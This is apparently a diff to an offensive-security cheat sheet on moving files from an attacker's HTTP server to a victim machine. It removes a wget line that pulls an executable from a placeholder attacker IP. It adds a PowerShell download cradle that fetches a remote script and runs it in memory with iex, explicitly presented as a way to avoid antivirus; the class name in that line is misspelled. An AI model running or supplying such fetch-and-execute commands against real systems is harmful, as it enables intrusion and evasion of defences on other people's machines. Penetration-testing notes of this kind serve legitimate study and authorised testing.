@@ -50,9 +50,14 @@ python -m http.server <PORT>
 Victim:
 
 ```powershell
-wget http://<ATTACKER_IP>:<PORT>/file.exe -O file.exe
-# Or
-Invoke-WebRequest -URI <URL> -OutFile <FILE>
+# Download and save
+Invoke-WebRequest <URL> -OutFile <FILE>
+```
+
+There's a method to download a PS script and run it without touching the disk (directly from memory). It's used to avoid antiviruses and so on.
+
+```powershell
+iex (NEw-Object New.WebClient).DownloadString("<URL_TO_SCRIPT.ps1>")
 ```
 
 ## 2. TCP socket
